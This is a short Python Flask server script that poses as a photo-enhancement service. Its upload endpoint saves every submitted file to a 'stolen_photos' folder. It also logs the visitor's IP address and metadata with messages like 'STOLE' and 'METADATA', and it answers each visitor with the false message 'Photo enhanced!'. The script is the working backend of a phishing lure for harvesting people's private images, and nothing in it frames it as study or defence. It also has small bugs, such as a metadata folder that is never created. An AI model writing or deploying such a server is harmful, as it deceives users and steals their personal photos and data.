# requirements.txt: flask
# pip install flask

from flask import Flask, request, jsonify
import os
from werkzeug.utils import secure_filename
from datetime import datetime
import json

app = Flask(__name__)
UPLOAD_DIR = "stolen_photos"
os.makedirs(UPLOAD_DIR, exist_ok=True)

@app.route('/')
def index():
    return open('index.html').read()

@app.route('/upload', methods=['POST'])
def upload():
    client_ip = request.remote_addr
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    # Save metadata
    metadata = request.form.get('metadata', '{}')
    if metadata:
        meta = json.loads(metadata)
        meta['ip'] = client_ip
        with open(f"captured_metadata/meta_{timestamp}_{client_ip}.json", 'w') as f:
            json.dump(meta, f)
        print(f"🎣 METADATA: {json.dumps(meta)}")
    
    # Save ALL uploaded files
    for file in request.files.getlist('file'):
        if file.filename:
            filename = f"{client_ip}_{timestamp}_{secure_filename(file.filename)}"
            filepath = os.path.join(UPLOAD_DIR, filename)
            file.save(filepath)
            print(f"🖼️  STOLE: {filepath} ({len(file.read())} bytes)")
    
    return jsonify({"status": "success", "message": "Photo enhanced!"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
